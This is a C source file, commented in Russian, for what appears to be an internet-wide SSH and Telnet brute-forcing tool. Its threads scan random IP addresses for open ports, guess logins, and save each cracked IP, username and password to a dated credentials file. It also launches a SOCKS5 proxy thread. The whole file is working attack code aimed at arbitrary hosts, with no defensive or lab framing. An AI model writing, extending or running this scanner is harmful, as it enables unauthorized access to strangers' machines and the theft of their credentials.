#include "bruteforce/ssh_bruteforce.c"
#include "bruteforce/telnet_bruteforce.c"
#include "socks5/proxy.h"
#include "include/includes.h"
#include "find_ips/finder.h"

void save_credentials_to_file(const char *ip, const char *service, const char *username, const char *password) {
    // Проверяем наличие "ETO" в username и password
    if (strstr(username, "ETO") != NULL || strstr(password, "ETO") != NULL) {
        fprintf(stderr, "Ошибка: 'ETO' найдено в username или password\n");
        return; // Выходим из функции, если "ETO" найдено
    }

    FILE *file;
    char filename[64];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    
    // Создаем имя файла в формате: credentials_YYYY-MM-DD.txt
    snprintf(filename, sizeof(filename), "credentials_%d-%02d-%02d-%d.txt", 
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, rand() % 2560);
    
    // Открываем файл в режиме добавления
    file = fopen(filename, "a");
    if (file == NULL) {
        fprintf(stderr, "Ошибка при открытии файла для сохранения учетных данных\n");
        return;
    }
    
    // Записываем данные в формате: [TIME] SERVICE IP:USERNAME:PASSWORD
    fprintf(file, "[%02d:%02d:%02d] %s %s:%s:%s\n",
            t->tm_hour, t->tm_min, t->tm_sec,
            service, ip, username, password);
    
    fclose(file);
}

// Обновленные функции потоков:
void *ssh_bruteforce_thread(void *arg) {
    while (1) {
        char ip_address[IP_ADDRESS_LENGTH];
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP для SSH: %s\n", ip_address);
        fflush(stdout);
        
        if (check_port_open_on_ip(ip_address, SSH_PORT) == 1) {
            Credentials ssh_credentials = ssh_brute(ip_address);
            if (ssh_credentials.good == 1) {
                printf("Успешный вход SSH: %s:%s\n", 
                       ssh_credentials.username, ssh_credentials.password);
                fflush(stdout);
                save_credentials_to_file(ip_address, "SSH", 
                                       ssh_credentials.username, 
                                       ssh_credentials.password);
            }
        }
        sleep(0.1);
    }
    return NULL;
}

void *telnet_bruteforce_thread(void *arg) {
    while (1) {
        char ip_address[IP_ADDRESS_LENGTH];
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP для Telnet: %s\n", ip_address);
        fflush(stdout);
        
        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
            Credentials telnet_credentials = telnet_brute(ip_address); // Assign the result to the initialized variable

            if (telnet_credentials.good == 1) {
                printf("Успешный вход Telnet: %s:%s\n", 
                       telnet_credentials.username, telnet_credentials.password);
                fflush(stdout);
                save_credentials_to_file(ip_address, "TELNET", 
                                       telnet_credentials.username, 
                                       telnet_credentials.password);
            }
        }
        
        usleep(100000); // 100ms задержка
    }
    return NULL;
}

void signal_handler(int signum) {
    printf("Получен сигнал %d, выполняется очистка...\n", signum);
    // Здесь можно добавить код очистки
    exit(signum);
}

int main() {

    while (1) {
        
        pthread_t ssh_threads[20];
        pthread_t telnet_threads[20];
        pthread_t socks5_thread_id;

        // Создание потоков для SSH брутфорса
        for (int i = 0; i < 20; i++) {
            if (pthread_create(&ssh_threads[i], NULL, ssh_bruteforce_thread, NULL) != 0) {
                fprintf(stderr, "Ошибка при создании потока SSH брутфорса\n");
                return 1;
            }
        }

        // Создание потоков для Telnet брутфорса
        for (int i = 0; i < 20; i++) {
                if (pthread_create(&telnet_threads[i], NULL, telnet_bruteforce_thread, NULL) != 0) {
                    fprintf(stderr, "Ошибка при создании потока Telnet брутфорса\n");
                    return 1;
            }
        }

        // Создание потока для SOCKS5 прокси
        if (pthread_create(&socks5_thread_id, NULL, main_socks, NULL) != 0) {
            fprintf(stderr, "Ошибка при создании потока SOCKS5\n");
            return 1;
        }

        while(1) {
            sleep(1); // Чтобы не нагружать процессор
        }

        // Ожидание завершения потоков SSH
        for (int i = 0; i < 20; i++) {
            pthread_detach(ssh_threads[i]);
        }

        // Ожидание завершения потоков Telnet
        for (int i = 0; i < 20; i++) {
            pthread_detach(telnet_threads[i]);
        }

        // Ожидание завершения потока SOCKS5
        pthread_detach(socks5_thread_id);
        return 0;
    }
}
